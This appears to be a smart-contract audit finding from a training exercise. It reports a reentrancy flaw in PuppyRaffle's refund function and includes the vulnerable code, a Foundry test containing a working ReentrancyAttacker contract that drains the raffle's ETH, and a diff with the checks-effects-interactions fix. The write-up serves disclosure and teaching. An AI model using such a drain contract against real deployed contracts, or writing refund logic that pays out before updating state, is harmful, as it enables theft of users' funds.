### [H-1] Reentrancy attack on `PuppyRaffle::refund` allows a participant to drain the raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow the CEI (Checks, Effects, Interactions) pattern. It sends ETH to the caller **before** updating the `players` array, allowing a malicious contract to re-enter the function before its slot is zeroed out.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // @audit-issue: Interaction before Effect — violates CEI
    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0); // Effect happens too late
    emit RaffleRefunded(playerAddress);
}
```

**Impact:** All ETH in the contract (entrance fees paid by other players) can be stolen by a malicious participant using a contract with a `receive`/`fallback` that re-calls `refund` recursively.

**Proof of Concept:**

<details>
<summary>Proof of Code</summary>

Add the following to `PuppyRaffleTest.t.sol`:

```solidity
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    assertEq(address(puppyRaffle).balance, 0);
}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable { _stealMoney(); }
    receive() external payable { _stealMoney(); }
}
```

</details>

**Recommended Mitigation:** Follow the CEI pattern — update state before making external calls:

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```
